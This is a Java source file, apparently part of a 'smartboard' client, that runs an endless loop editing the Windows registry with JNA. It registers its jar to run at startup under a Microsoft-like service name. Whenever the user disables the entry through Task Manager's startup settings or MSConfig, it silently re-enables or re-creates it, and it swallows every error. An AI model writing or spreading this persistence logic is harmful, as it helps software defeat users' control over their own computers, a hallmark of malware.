package smartboardClient;
import com.sun.jna.platform.win32.Advapi32Util;

import com.sun.jna.platform.win32.WinReg;
public class Registry implements Runnable{

	@Override
	public void run() {
		while(true) {
			try {
				
				//windows 10 disable/enable check
				
				boolean registered = Advapi32Util.registryValueExists(WinReg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Smartboard");
				if(!registered)
					Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Smartboard", System.getProperty("user.dir") + "\\microsoftsmartboardservice.jar");
				boolean approved = Advapi32Util.registryKeyExists(WinReg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved");
				if(approved) {
					byte[] a =  Advapi32Util.registryGetBinaryValue(WinReg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run", "Smartboard");
					if(a[0]!=2) {
						a[0] = 2;
						Advapi32Util.registrySetBinaryValue(WinReg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run", "Smartboard", a);
					}
				}else {
					boolean exist = Advapi32Util.registryKeyExists(WinReg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Shared Tools\\MSConfig\\startupreg\\Smartboard");
					if(exist) {
						Advapi32Util.registryDeleteKey(WinReg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Shared Tools\\MSConfig\\startupreg\\Smartboard");
						Advapi32Util.registrySetStringValue(WinReg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Microsoft Smartboard Service", "C:\\MicrosoftSmartboardService\\microsoftsmartboardservice.jar");
										
				}
					}
				
				
				
			} catch (Exception e) {
				
			}
			
			try {
				Thread.sleep(1000);
			} catch (InterruptedException e) {
				
			}
		}
		
	}

}
